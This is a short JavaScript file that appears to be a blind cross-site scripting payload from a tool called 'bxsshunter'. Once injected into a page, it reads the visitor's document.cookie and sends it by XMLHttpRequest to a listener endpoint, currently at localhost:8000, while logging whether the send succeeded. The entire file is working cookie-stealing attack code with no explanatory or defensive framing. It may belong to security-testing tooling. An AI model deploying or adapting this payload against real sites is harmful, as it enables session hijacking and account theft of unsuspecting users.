(function () {
  console.log('XSS payload injected.');

  // Capture the cookie and send it to the server
  var cookie = document.cookie;
  console.log('Captured Cookie:', cookie);

  var xhr = new XMLHttpRequest();
  xhr.open(
    'GET',
    'http://localhost:8000/api/bxsshunter/bxss-listener?cookie=' +
      encodeURIComponent(cookie),
    true,
  );
  xhr.onload = function () {
    if (xhr.status === 200) {
      console.log('Cookie sent successfully.');
    } else {
      console.error('Failed to send cookie.');
    }
  };
  xhr.onerror = function () {
    console.error('Request error.');
  };
  xhr.send();
})();
